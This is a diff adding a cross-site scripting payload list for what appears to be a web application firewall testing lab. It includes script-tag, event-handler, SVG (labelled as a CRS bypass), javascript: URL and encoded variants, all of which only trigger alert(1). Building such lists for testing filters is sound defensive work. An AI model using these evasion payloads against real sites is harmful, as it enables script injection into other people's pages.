@@ -1,0 +1,27 @@
+# XSS Payload List — waf-proxy-lab
+
+# === SCRIPT TAG ===
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<script >alert(1)</script >
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# === EVENT HANDLERS ===
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)><option>1</option></select>
+
+# === SVG (CRS bypass) ===
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>
+
+# === JAVASCRIPT PROTOCOL ===
+javascript:alert(1)
+<a href="javascript:alert(1)">click</a>
+
+# === ENCODED ===
+<script>alert&#40;1&#41;</script>
+<img src=x onerror=&#97;lert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
